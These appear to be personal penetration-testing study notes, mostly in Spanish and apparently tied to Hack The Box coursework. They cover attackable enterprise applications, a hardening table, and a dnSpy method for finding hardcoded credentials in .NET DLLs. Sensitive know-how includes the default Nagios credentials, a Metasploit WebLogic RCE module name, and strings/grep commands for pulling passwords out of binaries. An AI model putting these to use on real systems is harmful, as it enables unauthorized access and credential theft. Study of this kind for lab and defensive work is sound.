| [Zabbix](https://en.wikipedia.org/wiki/Zabbix)                              | Zabbix is an open-source system and network monitoring solution that has had quite a few [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-5667/product_id-9588/Zabbix-Zabbix.html) discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box [Zipper](https://youtube.com/watch?v=RLvFwiDK_F8&t=250) showcases how to use the Zabbix API to gain RCE.                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| [Nagios](https://en.wikipedia.org/wiki/Nagios)                              | Nagios is another system and network monitoring product. Nagios has had a wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials `nagiosadmin:PASSW0RD` and fingerprinting the version.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| [WebLogic](https://en.wikipedia.org/wiki/Oracle_WebLogic_Server)            | WebLogic is a Java EE application server. At the time of writing, it has 190 reported [CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-14534/Oracle-Weblogic-Server.html). There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Wikis/Intranets                                                             | We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [DotNetNuke](https://en.wikipedia.org/wiki/DNN_\(software\))                | DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe [issues](https://www.cvedetails.com/vulnerability-list/vendor_id-2486/product_id-4306/Dotnetnuke-Dotnetnuke.html) over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| [vCenter](https://en.wikipedia.org/wiki/VCenter)                            | vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this [Apache Struts 2 RCE](https://blog.gdssecurity.com/labs/2017/4/13/vmware-vcenter-unauthenticated-rce-using-cve-2017-5638-apach.html) that scanners like Nessus do not pick up. This [unauthenticated OVA file upload](https://www.rapid7.com/db/modules/exploit/multi/http/vmware_vcenter_uploadova_rce/) vulnerability was disclosed in early 2021, and a PoC for [CVE-2021-22005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005) was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin! It can be a great foothold in the environment or be a single source of compromise. |
En HTB explican uno de WebLogi¡c que se explota con el módulo de metasploit: `/multi/http/weblogic_admin_handle_rce`

# Hardering de aplicaciones comunes

|Application|Hardening Category|Discussion|
|---|---|---|
|[WordPress](https://wordpress.org/support/article/hardening-wordpress/)|Security monitoring|Use a security plugin such as [WordFence](https://www.wordfence.com/) which includes security monitoring, blocking of suspicious activity, country blocking, two-factor authentication, and more|
|[Joomla](https://docs.joomla.org/Security_Checklist/Joomla!_Setup)|Access controls|A plugin such as [AdminExile](https://extensions.joomla.org/extension/adminexile/) can be used to require a secret key to log in to the Joomla admin page such as `http://joomla.inlanefreight.local/administrator?thisismysecretkey`|
|[Drupal](https://www.drupal.org/docs/security-in-drupal)|Access controls|Disable, hide, or move the [admin login page](https://www.drupal.org/docs/7/managing-users/hide-user-login)|
|[Tomcat](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)|Access controls|Limit access to the Tomcat Manager and Host-Manager applications to only localhost. If these must be exposed externally, enforce IP whitelisting and set a very strong password and non-standard username.|
|[Jenkins](https://www.jenkins.io/doc/book/security/securing-jenkins/)|Access controls|Configure permissions using the [Matrix Authorization Strategy plugin](https://plugins.jenkins.io/matrix-auth)|
|[Splunk](https://docs.splunk.com/Documentation/Splunk/8.2.2/Security/Hardeningstandards)|Regular updates|Make sure to change the default password and ensure that Splunk is properly licensed to enforce authentication|
|[PRTG Network Monitor](https://helpdesk.paessler.com/en/support/solutions/articles/76000062446-what-security-features-does-prtg-include-)|Secure authentication|Make sure to stay up-to-date and change the default PRTG password|
|osTicket|Access controls|Limit access from the internet if possible|
|[GitLab](https://about.gitlab.com/blog/2020/05/20/gitlab-instance-security-best-practices/)|Secure authentication|Enforce sign-up restrictions such as requiring admin approval for new sign-ups, configuring allowed and denied domains|
# Cosas extra que organizar
Para RDP mejorado poner `/dynamic-resolution`

Ficha de servicios LDAP (389/636)

## Metodologia de dnSpy
Entiendo la confusión. Te explico la metodología para no perderte en estas tareas:

  ¿Por qué ese archivo y no otro?

  La clave está en el contexto del box. Aquí es una API web en IIS, por eso:
  - C:\inetpub\wwwroot\ → directorio raíz de IIS (siempre empieza aquí en boxes Windows web)
  - \bin\ → donde van los DLLs de aplicaciones .NET
  - MultimasterAPI.dll → el nombre lo dice todo: es la API principal

  Regla general para buscar credenciales hardcodeadas:
  Servicio web IIS → C:\inetpub\wwwroot\
  Servicio web Apache/Tomcat → webapps\ o htdocs\
  Aplicación .NET → busca en \bin\ los .dll
  Aplicación Java → busca .jar o .war
  Config files → web.config, appsettings.json, *.config

  Metodología de análisis de binarios

  Paso 1 — Identifica el tipo de archivo:
  - .dll o .exe de .NET → usa dnSpy (lo descompila como si fuera código fuente C#)
  - .dll nativo (C/C++) → usa Ghidra o IDA
  - .jar Java → usa jadx o JD-GUI

  Paso 2 — En dnSpy, ¿dónde buscar?

  Una vez abierto el DLL en dnSpy, expande el árbol y busca:
  - Clases con nombres como Database, Config, Connection, Helper
  - Strings hardcodeadas tipo Password=, pwd=, Data Source=

  O usa Edit → Search (Ctrl+F) y busca:
  password
  pwd=
  connectionstring
  Data Source
  Server=

  Paso 3 — Alternativa rápida sin GUI (desde Kali):
  # Si tienes el DLL en Linux, strings básico:
  strings MultimasterAPI.dll | grep -i "password\|pwd\|pass\|conn"

  # Para .NET DLLs, usa mono o ilspycmd:
  ilspycmd MultimasterAPI.dll | grep -i "password"

  Resumen mental para estas tareas

  Cuando veas "encuentra credenciales en X aplicación":
  1. ¿Qué tecnología corre? → elige la herramienta correcta
  2. ¿Dónde están sus archivos? → sigue la ruta estándar del servicio
  3. Busca siempre: password, connectionstring, secret, key, token